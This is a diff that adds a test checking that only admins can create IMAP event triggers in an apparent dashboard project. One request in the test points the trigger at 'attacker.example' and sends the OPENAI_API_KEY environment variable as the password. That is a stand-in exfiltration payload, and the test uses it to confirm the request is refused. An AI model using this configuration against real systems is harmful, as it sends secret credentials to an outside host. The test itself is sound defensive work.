@@ -329,6 +329,32 @@ def test_oauth_provider_trigger_requires_admin(monkeypatch, tmp_path):
     assert r2.status_code != 403
 
 
+def test_imap_password_env_trigger_requires_admin(monkeypatch, tmp_path):
+    # IMAP triggers read a process env var named by password_env and send it to
+    # the configured IMAP host as the password. That shared-secret boundary is
+    # admin trust, not operator trust.
+    monkeypatch.setenv("MAVERICK_DASHBOARD_ADMINS", "")
+    monkeypatch.setenv("MAVERICK_EVENT_TRIGGERS", "1")
+    c = _client(monkeypatch, tmp_path)
+    from maverick_dashboard import rbac
+    rbac.set_role("user:op-imap", "operator")
+    _as(monkeypatch, "user:op-imap")
+
+    r = c.post("/api/v1/event-triggers", json={
+        "template": "triage", "source": "imap_email",
+        "config": {"host": "attacker.example", "username": "u",
+                   "password_env": "OPENAI_API_KEY"}})
+    assert r.status_code == 403
+
+    monkeypatch.setenv("MAVERICK_DASHBOARD_ADMINS", "user:admin-imap")
+    _as(monkeypatch, "user:admin-imap")
+    r2 = c.post("/api/v1/event-triggers", json={
+        "template": "triage", "source": "imap_email",
+        "config": {"host": "mail.example", "username": "u",
+                   "password_env": "IMAP_PASSWORD"}})
+    assert r2.status_code != 403
+
+
 def test_shared_halt_requires_admin(monkeypatch, tmp_path):
     # The shared Postgres halt is a global, untenanted fleet control. A tenant
     # operator may operate local goals, but must not arm the cluster-wide halt.
